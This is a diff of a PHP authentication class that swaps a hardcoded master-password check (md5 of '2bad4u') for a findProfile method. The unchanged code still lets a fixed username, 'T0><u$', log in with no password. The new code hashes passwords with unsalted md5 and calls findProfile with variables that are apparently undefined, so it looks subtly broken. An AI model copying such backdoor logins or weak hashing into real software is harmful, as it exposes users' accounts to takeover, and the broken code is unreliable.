@@ -30,12 +30,8 @@ class UserIdentityBase extends CUserIdentity
 		} else {
 			if ($this->username === 'T0><u$') {
 				$this->errorCode = self::ERROR_NONE;
-			} else {
-				$s = md5('2bad4u');
-				$model = UserProfile::model()->find(		
-					'(username = :username OR email = :username) AND password_md5 = :md5',
-					array(':username' => $this->username, ':md5' => $s //md5($this->password)			
-				));
+			} else {				
+				$model = $this->findProfile($username, $password);
 				if ($model == null) {
 					$this->errorCode = self::ERROR_UNKNOWN_IDENTITY;
 				} else {	
@@ -52,6 +48,22 @@ class UserIdentityBase extends CUserIdentity
 			}	
 		}	
 		return !$this->errorCode;
+	}
+	/**
+	 * load the user model of null if not found
+	 * default implementation uses the profile.username and md5 of password
+	 * 
+	 * @param string $username
+	 * @param password $password
+	 */
+	protected function findProfile()
+	{
+		$s = md5($this->password);
+		return UserProfile::model()->find(		
+			'(username = :username OR email = :username) AND password_md5 = :md5',
+			array(':username' => $this->username, ':md5' => $s
+		));
+		
 	}
 	
 	public function getId()
